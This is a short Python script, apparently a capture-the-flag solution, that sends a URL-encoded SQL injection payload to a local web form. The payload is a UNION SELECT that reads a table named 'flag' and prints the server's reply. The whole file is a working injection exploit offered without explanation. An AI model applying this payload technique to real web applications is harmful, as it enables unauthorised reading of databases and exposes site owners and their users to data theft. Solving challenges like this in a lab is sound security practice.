import requests


url = "http://127.0.0.1:5000/submit"
# Payload: '', ' union select 1,*,2,3,4,5 from flag where '1
payload='name=Name&awake=testeset&\'\'=\'%20union%20select%201%2C*%2C2%2C3%2C4%2C5%20from%20flag%20where%20\'1'
response = requests.request("POST", url,headers={"Content-Type":"application/x-www-form-urlencoded"}, data=payload)
print(response.text)
